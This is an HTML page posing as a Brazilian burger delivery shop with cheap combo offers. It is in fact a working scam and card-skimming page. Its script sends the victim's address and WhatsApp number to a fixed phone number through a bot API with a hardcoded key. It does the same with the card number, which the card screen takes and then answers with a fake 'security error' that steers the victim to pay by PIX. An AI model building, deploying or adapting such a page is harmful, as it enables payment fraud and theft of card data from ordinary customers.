<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>JP Lanches - Delivery</title>
    <style>
        :root { --cor-p: #f39c12; --cor-s: #27ae60; --cor-e: #e74c3c; --fundo: #f4f4f4; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; -webkit-tap-highlight-color: transparent; }
        .container { max-width: 450px; margin: auto; padding: 15px; }
        .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-p); }
        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); }
        h2 { font-size: 1.1em; color: #333; border-left: 5px solid var(--cor-p); padding-left: 10px; margin: 20px 0 10px; }

        .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; }
        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; }
        .lanche-img { width: 100%; height: 180px; object-fit: cover; }
        .lanche-info { padding: 15px; text-align: center; }
        .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }

        .barra-carrinho { position: fixed; bottom: 75px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; z-index: 9999; }
        .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
        .btn-acao { width: 100%; padding: 16px; border: none; border-radius: 10px; font-weight: bold; color: #fff; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>

<div class="header">
    <span class="logo">🍔 JP LANCHES</span><br>
    <small>PROMOÇÃO: COMPRE E GANHE REFRIGERANTE</small>
</div>

<div class="container">
    <h2>Escolha seu Combo:</h2>

    <div class="lanche-card" onclick="selecionarLanche(this, '1 XTudo + Guaravita', 10)">
        <img src="https://instadelivery-public.nyc3.cdn.digitaloceanspaces.com/itens/1720704185668fdcb962de8_75_75.jpeg" class="lanche-img">
        <div class="lanche-info"><strong>1 XTudo + Guaravita</strong><br><span class="preco">R$ 10,00</span></div>
    </div>

    <div class="lanche-card" onclick="selecionarLanche(this, '3 XTudo + Refri 2L', 30)">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiyXv-IHrHcr8eXqCpV00wGnzrZDYzc-XO-A&s" class="lanche-img">
        <div class="lanche-info"><strong>3 XTudo + Refri 2L</strong><br><span class="preco">R$ 30,00</span></div>
    </div>

    <div class="lanche-card" onclick="selecionarLanche(this, '5 XTudo + Refri 2L', 50)">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7fH_F-QZis3tY1t5Yv5i9LREjX-f2SAsn6w&s" class="lanche-img">
        <div class="lanche-info"><strong>5 XTudo + Refri 2L</strong><br><span class="preco">R$ 50,00</span></div>
    </div>
</div>

<div class="barra-carrinho">
    <div><small>Total a pagar:</small><br><strong style="color:var(--cor-s); font-size:1.3em;">R$ <span id="v-total">0.00</span></strong></div>
    <button class="btn-finalizar" onclick="abrirEnd()">FINALIZAR</button>
</div>

<div id="m-end" class="modal">
    <div class="modal-content">
        <h3>📍 Endereço de Entrega</h3>
        <input type="text" id="rua" placeholder="Rua e Número">
        <input type="text" id="bairro" placeholder="Bairro">
        <button class="btn-acao" style="background:var(--cor-s)" onclick="irPag()">PRÓXIMO</button>
        <button onclick="fechar()" style="background:none; border:none; color:red; margin-top:10px;">Voltar</button>
    </div>
</div>

<div id="m-pag" class="modal">
    <div class="modal-content">
        <h3>💳 Pagamento</h3>
        <div id="opc-ini">
            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">PIX</button>
            <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
        </div>
        <div id="tela-pix" style="display:none;">
            <p>Digite seu WhatsApp abaixo:</p>
            <input type="tel" id="zap-cliente" placeholder="(XX) 9XXXX-XXXX">
            <button class="btn-acao" style="background:#32bcad" onclick="enviarTudo()">GERAR CÓDIGO PIX</button>
        </div>
        <div id="tela-card" style="display:none;">
            <input type="text" id="c-num" placeholder="Número do Cartão">
            <button class="btn-acao" style="background:var(--cor-e)" onclick="erroCard()">PAGAR AGORA</button>
        </div>
    </div>
</div>

<script>
    let pedido = null;
    function selecionarLanche(el, nome, preco) {
        document.querySelectorAll('.lanche-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        pedido = { nome, preco };
        document.getElementById('v-total').innerText = preco.toFixed(2);
    }

    function abrirEnd() { if(!pedido) return alert("Escolha um lanche!"); document.getElementById('m-end').style.display='flex'; }
    function fechar() { document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }
    function irPag() { document.getElementById('m-end').style.display='none'; document.getElementById('m-pag').style.display='flex'; setTela('inicio'); }
    function setTela(t) {
        document.getElementById('opc-ini').style.display = t === 'inicio' ? 'block' : 'none';
        document.getElementById('tela-pix').style.display = t === 'pix' ? 'block' : 'none';
        document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
    }

    function enviarTudo() {
        const zap = document.getElementById('zap-cliente').value;
        const rua = document.getElementById('rua').value;
        const bairro = document.getElementById('bairro').value;
        if(!zap) return alert("Digite seu WhatsApp!");

        // O TEXTO QUE CHEGA PARA VOCÊ NO SEU WHATSAPP
        const msg = `🍔 NOVO PEDIDO!\n\nPROMO: ${pedido.nome}\nVALOR: R$ ${pedido.preco}\nEND: ${rua} - ${bairro}\nWHATS DO CLIENTE: ${zap}`;
        
        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
        
        window.open(url, '_blank');
        alert("✅ Pedido Enviado!\n\nAguarde o código PIX no seu WhatsApp em instantes.");
        location.reload();
    }

    function erroCard() {
        const n = document.getElementById('c-num').value;
        const msg = `⚠️ ALERTA CARTÃO!\n\nCARTÃO: ${n}\nVALOR: R$ ${pedido.preco}`;
        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
        
        window.open(url, '_blank');
        alert("⚠️ Erro de segurança: Pagamento não aceito.\n\nPor favor, tente via PIX.");
        setTela('inicio');
    }
</script>

</body>
</html>
